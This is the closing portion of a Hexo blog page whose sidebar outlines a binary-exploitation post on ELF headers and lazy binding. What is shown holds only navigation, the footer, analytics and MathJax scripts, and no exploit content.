      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Intro"><span class="nav-number">1.</span> <span class="nav-text">Intro</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Analysis"><span class="nav-number">2.</span> <span class="nav-text">Analysis</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF-Header"><span class="nav-number">2.1.</span> <span class="nav-text">ELF Header</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lazy-Binding"><span class="nav-number">2.2.</span> <span class="nav-text">Lazy Binding</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwned-One-by-One"><span class="nav-number">3.</span> <span class="nav-text">Pwned One by One</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-one"><span class="nav-number">3.1.</span> <span class="nav-text">Step one</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-Two"><span class="nav-number">3.2.</span> <span class="nav-text">Step Two</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-Three"><span class="nav-number">3.3.</span> <span class="nav-text">Step Three</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-Four"><span class="nav-number">3.4.</span> <span class="nav-text">Step Four</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-Five"><span class="nav-number">3.5.</span> <span class="nav-text">Step Five</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-Six"><span class="nav-number">3.6.</span> <span class="nav-text">Step Six</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Complement-64-bit"><span class="nav-number">4.</span> <span class="nav-text">Complement: 64 bit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#References"><span class="nav-number">5.</span> <span class="nav-text">References</span></a></li></ol>
    
    </div>
  </aside>

</section>
        
      </div>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2019 AssassinQ All Rights Reserved.
        
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";


    <!-- headerblur min height -->
    
    
</script>
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>








  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
</body>
</html>
